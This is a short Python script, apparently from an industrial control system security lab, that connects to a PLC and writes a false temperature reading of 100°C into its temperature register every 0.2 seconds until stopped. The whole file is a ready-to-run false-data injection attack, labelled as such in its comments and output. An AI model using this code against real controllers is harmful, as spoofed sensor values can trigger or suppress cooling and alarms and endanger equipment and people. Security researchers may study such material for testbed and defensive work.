import time
import config
import plc_module


# ==========================================
# ATTACK CONFIGURATION
# ==========================================

false_temperature = 100.0
write_interval = 0.2  # Seconds between writes


# ==========================================
# INDEPENDENT PLC CONNECTION
# ==========================================

plc = plc_module.PLCModule(
    ip=config.PLC_IP,
    port=config.PLC_PORT,
    device_id=config.DEVICE_ID,
    temperature_register=config.TEMPERATURE_REGISTER,
    cooling_coil=config.COOLING_COIL,
    alarm_coil=config.ALARM_COIL
)


# ==========================================
# CONSTANT FALSE-TEMPERATURE ATTACK
# ==========================================

try:
    plc.connect()

    temperature_x10 = round(false_temperature * 10)

    print(f"Writing false temperature: {false_temperature:.1f}°C")
    print("Press Ctrl+C to stop.")

    while True:
        plc.write_temperature(temperature_x10)
        time.sleep(write_interval)

except KeyboardInterrupt:
    print("\nAttack stopped.")

finally:
    plc.close()